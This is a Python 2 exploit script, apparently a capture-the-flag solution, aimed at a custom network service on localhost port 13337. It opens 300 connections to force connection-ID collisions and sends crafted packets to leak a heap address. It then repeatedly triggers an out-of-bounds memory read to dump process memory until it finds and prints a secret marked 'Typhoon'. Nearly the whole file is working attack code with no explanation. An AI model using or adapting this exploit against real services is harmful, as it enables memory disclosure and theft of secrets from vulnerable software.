import time
import socket
import struct 
import threading

u32 = lambda x: struct.unpack('<I', x)[0]
p32 = lambda x: struct.pack('<I', x)
p16 = lambda x: struct.pack('<H', x)
p8 = lambda x: struct.pack('<B', x)


HOST, PORT = "localhost", 13337

def hexdump(src, length=16):
    FILTER = ''.join([(len(repr(chr(x))) == 3) and chr(x) or '.' for x in range(256)])
    lines = []
    for c in xrange(0, len(src), length):
        chars = src[c:c+length]
        hex = ' '.join(["%02x" % ord(x) for x in chars])
        printable = ''.join(["%s" % ((ord(x) <= 127 and FILTER[ord(x)]) or '.') for x in chars])
        lines.append("%04x  %-*s  %s\n" % (c, length*3, hex, printable))
    return ''.join(lines)

mutex = threading.Lock()
i = 0
def log(x, type):
    mutex.acquire()
    global i
    print type
    print hexdump(x)
    print i
    i += 1
    mutex.release()


class Connection(object):
    def __init__(self):
        self.r = socket.socket()
        self.r.connect((HOST, PORT))

    def NullSizeType2(self):
        threading.Thread(target=self._NullSizeType2).start()

    def _NullSizeType2(self):
        payload = p32(0xDEADBEEF) + p8(0) + p8(3)
        self.r.send(payload)

    def Type2(self, data):
        threading.Thread(target=self._Type2, args=(data,)).start()

    def _Type2(self, data):
        payload = p32(0xDEADBEEF)
        if isinstance(data, tuple) or isinstance(data, list):
            payload += p8(len(data)) + p8(3)
            for content in data:
                payload += p8(len(content))
                payload += content
        else:
            payload += p8(1)
            payload += p8(3)
            payload += p8(len(data))
            payload += data
        
        assert len(payload) <= 0x1000
        
        self.r.send(payload)

    def LeakMem(self, addr, size, times):
        threading.Thread(target=self._LeakMem, args=(addr, size, times)).start()

    def _LeakMem(self, addr, size, times):
        assert size < 0xff

        payload = p32(0xDEADBEEF) + p8(times) + p8(4)
        for _ in range(times):
            payload += p32(size)
            payload += p32(addr // size)
            addr += size

        assert len(payload) <= 0x1000
        
        self.r.send(payload)

    def Type4(self, size, ptr, times):
        threading.Thread(target=self._Type4, args=(size, ptr, times)).start()

    def _Type4(self, size, ptr, times):
        payload = p32(0xDEADBEEF) + p8(times) + p8(4)
        for _ in range(times):
            payload += p32(size)
            payload += p32(ptr)

        assert len(payload) <= 0x1000

        self.r.send(payload)

    def Recv(self):
        return self.r.recv(0xffff)


# Step one create ID collisions
print "[!] Creating ID collisions...",
socks = [Connection() for _ in range(300)]
# Connections 256 - 299 are now colliding with 0 - 44 
print "Done"

T1 = socks[0]
T2 = socks[256]

print "[!] Leaking Heap...",

T1.Type2(("a", ))
time.sleep(2)
T2.Type4(1, 0x0400000, 99)


leak = T2.Recv()
heapleak = u32(leak[10:14])
# secret should be atleast (0xf0 * 0xff) & 0x80 bytes infront of heapleak 
secret = (heapleak) & -0x80

print "Done"
print "\t[+] Heap leak @", hex(heapleak)
print "\t[+] Start dump @", hex(secret)

print "[!] Leaking memory...",

T3 = socks[1]
T4 = socks[257]
# Get right size
orgsec = secret
# while True:
#     size = 0x26
#     for _ in range(0xff - 0x26):
#         if secret % (size) == 0:
#             break
#         size += 1
#     if orgsec - (0xff - 0x26) == secret:
#         print "[-] Heap not reachable in one go, splitting..."
#         break
#     if size == 0xff:
#         secret -= 1
#     else:
#         break

dump = ""
sockets = 1

while dump.find("first!") == -1:
    T3 = socks[sockets]
    T4 = socks[256 + sockets]

    T3.LeakMem(secret, 0x80, 0x15)
    time.sleep(1)
    T4.Type2(["aa"] * (100 - 0x15))
    reg = T4.Recv()
    #print hexdump(reg)
    dump += reg

    sockets += 1
    secret += (0x80 * 0x15)
    if sockets >= 45:
        print "\n45 Socks werent enough...",
        break

TargetMsg = dump[dump.find("Typhoon"):dump.find("Typhoon") + 0x26]
print "Done"
print "[+] Secret: "
print TargetMsg

raw_input()
